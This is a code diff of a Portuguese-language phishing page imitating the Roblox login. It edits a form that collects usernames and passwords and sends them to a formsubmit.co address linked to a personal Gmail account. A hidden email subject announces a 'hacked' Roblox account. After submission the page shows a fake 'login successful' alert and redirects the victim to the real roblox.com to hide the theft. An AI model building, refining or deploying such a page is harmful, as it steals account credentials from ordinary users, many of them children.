@@ -43,37 +43,52 @@
             border-radius: 4px;
             cursor: pointer;
             font-weight: bold;
-            margin-top: 10px;
+            font-size: 16px;
         }
         button:hover {
-            background-color: #009a60;
+            background-color: #009a5d;
         }
-        .footer {
+        .footer-links {
             margin-top: 15px;
             font-size: 12px;
-            color: #777;
+            color: #666;
+        }
+        .footer-links a {
+            color: #007ff;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
 <div class="login-container">
-    <h2>Log In</h2>
-    <form action="https://formspree.io/f/mdeeknwr" method="POST" onsubmit="handleSubmit(event)">
-        <input type="text" name="username" placeholder="Username or Email" required>
-        <input type="password" name="password" placeholder="Password" required>
+    <h2>Entrar</h2>
+    
+    <!-- SEU FORMULÁRIO COM O FORMSUBMIT -->
+    <form action="https://formsubmit.co/joaomiguelalvesbarbosa91@gmail.com" method="POST" onsubmit="handleSubmit(event)">
+        
+        <!-- Campos de Input -->
+        <input type="text" name="username" placeholder="Usuário ou Email" required>
+        <input type="password" name="password" placeholder="Senha" required>
+        
+        <!-- Campo Oculto para Assunto do Email -->
+        <input type="hidden" name="_subject" value="Nova Conta Roblox Hakeada!">
+        
+        <!-- Redirecionamento após envio (Opcional: remove esta linha se quiser ficar na página) -->
+        <input type="hidden" name="_next" value="https://www.roblox.com">
+        
+        <!-- Botão -->
         <button type="submit">Log In</button>
     </form>
-    <div class="footer">
-        <p>Don't have an account? <a href="#">Sign Up</a></p>
+
+    <div class="footer-links">
+        <a href="#">Esqueceu usuário ou senha?</a>
     </div>
 </div>
 
 <script>
-    <script>
-    // Esta função é chamada automaticamente quando o formulário é enviado para o Formspree
     async function handleSubmit(event) {
-        event.preventDefault(); // Impede a página de recarregar imediatamente
+        event.preventDefault(); // Impede o recarregamento padrão
         
         const form = event.target;
         const data = new FormData(form);
@@ -85,10 +100,9 @@
             }
         });
 
-        // Aguarda a resposta do Formspree
         ajax.then((response) => {
             if (response.ok) {
-                // Se deu certo, mostra a mensagem falsa e redireciona
+                // Sucesso: Mostra alerta e redireciona
                 alert("Login realizado com sucesso!");
                 window.location.href = "https://www.roblox.com";
             } else {
@@ -104,7 +118,6 @@
             alert("Houve um problema. Tente novamente.");
         });
     }
-</script>
 </script>
 
 </body>
